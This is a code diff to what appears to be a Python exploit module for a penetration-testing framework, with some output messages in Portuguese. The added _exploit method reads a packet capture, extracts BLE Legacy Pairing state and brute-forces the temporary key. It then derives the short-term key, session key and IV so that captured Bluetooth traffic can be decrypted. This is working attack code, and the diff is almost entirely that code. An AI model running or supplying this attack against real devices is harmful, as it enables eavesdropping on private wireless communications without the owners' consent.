@@ -92,7 +92,7 @@ def _aes_ecb_encrypt(key: bytes, data: bytes) -> bytes:
 
 def _xor_16(a: bytes, b: bytes) -> bytes:
     """XOR two 16-byte blocks."""
-    return bytes(x ^ y for x, y in zip(a, b))
+    return bytes(x ^ y for x, y in zip(a, b, strict=False))
 
 
 def calc_confirm(preq: bytes, pres: bytes, iat: int, rat: int,
@@ -461,3 +461,41 @@ class Exploit(Exploit):
         print_info("  STK:         {}".format(state.stk.hex() if state.stk else "N/A"))
         print_info("  Session Key: {}".format(state.session_key.hex() if state.session_key else "N/A"))
         print_info("  LTK:         {}".format(state.ltk.hex() if state.ltk else "N/A"))
+
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: crack BLE Legacy Pairing and decrypt captured traffic."""
+        if not HAS_CRYPTO:
+            return
+        if not self.pcap_file:
+            return
+
+        state = self._extract_pairing_state()
+        if state is None:
+            return
+
+        if state.has_sc and not state.lesc_debug_key:
+            print_info("LESC detected: use crackle with LESC debug key or skip")
+            return
+
+        if state.ltk:
+            print_success(f"E2E: LTK direto do pcap: {state.ltk.hex()}")
+            return
+
+        tk = state.tk if hasattr(state, 'tk') and state.tk is not None else None
+        if tk is None and self.known_tk >= 0:
+            tk = self.known_tk
+        elif tk is None:
+            tk = brute_force_tk(state, workers=self.workers)
+
+        if tk is not None:
+            state.tk = tk
+            if state.mrand and state.srand:
+                stk = calc_stk(state.mrand, state.srand, tk)
+                if stk and state.skdm and state.skds:
+                    session_key = calc_session_key(stk, state.skdm, state.skds)
+                    print_success(f"E2E: Session key derivada: {session_key.hex()}")
+                    if state.ivm and state.ivs:
+                        iv = calc_iv(state.ivm, state.ivs)
+                        print_success(f"E2E: IV para decriptação: {iv.hex()}")
